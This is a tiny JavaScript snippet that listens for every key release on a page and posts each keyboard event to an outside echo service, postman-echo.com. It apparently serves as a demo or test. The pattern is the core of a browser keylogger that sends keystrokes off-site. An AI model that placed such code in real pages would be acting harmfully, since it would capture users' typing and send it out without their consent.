const makeHttpRequest = (event) => {
  axios.post("https://postman-echo.com/post", {event})
}

document.addEventListener('keyup', makeHttpRequest);
